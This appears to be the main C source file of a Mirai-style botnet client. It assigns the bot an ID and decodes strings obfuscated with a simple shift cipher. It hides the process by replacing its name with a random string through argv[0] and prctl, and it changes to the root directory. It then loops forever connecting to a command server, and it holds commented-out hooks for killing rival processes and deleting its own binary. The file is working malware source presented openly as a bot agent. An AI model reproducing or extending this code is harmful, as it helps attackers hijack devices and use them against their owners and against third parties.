#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/prctl.h>
#include <fcntl.h>
#include <signal.h>
#include <sys/wait.h>
#include <stdlib.h>
#include "headers/connection.h"
#include "headers/includes.h"
#include "headers/rand.h"
#include "headers/util.h"
#include "headers/encryption.h"
#include "headers/killer.h"
int main(int argc, char **args) 
{ 
    int ourPid;
	if(args[1] == NULL)
	{
    	char enc_unk[] = {"xqnqrzq"}; // unknown
        util_encryption(enc_unk);
        strcpy(bot.id, enc_unk);
    }
    else
    {
    	strcpy(bot.id, args[1]);
    }
    //encrypt_array();
    char name_buf[32];
    int name_buf_len;
    //unlink(args[0]);
    rand_init();
    name_buf_len = ((rand_next() % 4) + 3) * 4;
    rand_alphastr(name_buf, name_buf_len);
    name_buf[name_buf_len] = 0;
    strcpy(args[0], name_buf);
    name_buf_len = ((rand_next() % 6) + 3) * 4;
    rand_alphastr(name_buf, name_buf_len);
    name_buf[name_buf_len] = 0;
    prctl(15, name_buf);
    chdir("/");
    char message[] = {"khoor#iulhqg#=,"}; // hello friend :)
    util_encryption(message);
    printf("%s\n", message);
    ourPid = getpid();
    //killer();
    while(1)
    {
        connection_establish();
        sleep(1);
    }
    return 0;
}
